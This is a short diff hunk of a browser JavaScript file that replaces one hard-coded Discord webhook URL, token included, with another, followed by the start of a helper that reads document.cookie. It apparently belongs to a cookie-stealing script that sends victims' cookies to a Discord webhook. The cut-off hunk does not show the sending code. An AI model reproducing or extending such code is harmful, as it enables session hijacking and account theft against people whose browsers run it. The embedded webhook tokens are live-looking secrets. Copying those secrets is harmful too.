@@ -1,5 +1,5 @@
 (async function() {
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537484377238282261/TSWp8lU_MeXgZaBOi6APG4Av9TNyq1hwl-6REfiK5Kj97S9nqLinqfK9laFiexkG9Jjz';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537592532022722701/ebydykAoToicmEASAyDJuwJ-CslG0KKnKo61CgXj-q0DdjuOcZaUvtIn1RXfRHxnOqqM';
 
     const getCookie = (name) => {
         const matches = document.cookie.match(new RegExp(
